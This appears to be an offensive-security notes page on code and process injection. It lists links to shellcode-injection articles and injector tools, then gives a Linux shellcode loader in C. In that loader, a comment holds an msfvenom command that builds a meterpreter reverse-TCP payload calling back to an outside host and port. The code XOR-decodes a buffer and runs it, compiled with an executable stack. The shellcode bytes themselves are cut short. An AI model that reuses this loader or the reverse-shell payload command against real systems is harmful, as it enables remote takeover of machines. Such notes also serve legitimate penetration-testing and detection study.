# Code Injection

* [https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process](https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process)
* [https://www.solomonsklash.io/syscalls-for-shellcode-injection.html](https://www.solomonsklash.io/syscalls-for-shellcode-injection.html)
* [https://jhalon.github.io/utilizing-syscalls-in-csharp-1/](https://jhalon.github.io/utilizing-syscalls-in-csharp-1/)
* [https://jhalon.github.io/utilizing-syscalls-in-csharp-2/](https://jhalon.github.io/utilizing-syscalls-in-csharp-2/)
* [https://blog.xpnsec.com/weird-ways-to-execute-dotnet/](https://blog.xpnsec.com/weird-ways-to-execute-dotnet/)
* [https://github.com/jhalon/SharpCall](https://github.com/jhalon/SharpCall)




## Shellcode as Function

* [http://disbauxes.upc.es/code/two-basic-ways-to-run-and-test-shellcode/](http://disbauxes.upc.es/code/two-basic-ways-to-run-and-test-shellcode/)
* [https://www.fergonez.net/post/shellcode-csharp](https://www.fergonez.net/post/shellcode-csharp)
* [https://www.ired.team/offensive-security/code-injection-process-injection/local-shellcode-execution-without-windows-apis](https://www.ired.team/offensive-security/code-injection-process-injection/local-shellcode-execution-without-windows-apis)
* [https://github.com/byt3bl33d3r/OffensiveNim/issues/16](https://github.com/byt3bl33d3r/OffensiveNim/issues/16)
* [https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Linux%20Shellcode%20Loaders/simpleLoader.c](https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Linux%20Shellcode%20Loaders/simpleLoader.c)

Linux example. Compile allowing execution on stack:

```
$ gcc -o loader loader.c -z execstack
```

{% code title="loader.c" %}
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.13.37 LPORT=1337 -f c -o met.c --encrypt xor --encrypt-key a
unsigned char buf[] = 
"\x31\x33...\x33\x37";

int main (int argc, char **argv)
{
	int bufsize = (int)sizeof(buf);
	for (int i = 0; i < bufsize-1; i++) { buf[i] = buf[i] ^ 'a'; }
	int (*ret)() = (int(*)())buf;
	ret();
}
```
{% endcode %}




## Tools



### Injector

* [https://github.com/0xDivyanshu/Injector](https://github.com/0xDivyanshu/Injector)
* [https://github.com/jfmaes/SharpZipRunner](https://github.com/jfmaes/SharpZipRunner)
* [https://github.com/plackyhacker/Shellcode-Injection-Techniques](https://github.com/plackyhacker/Shellcode-Injection-Techniques)
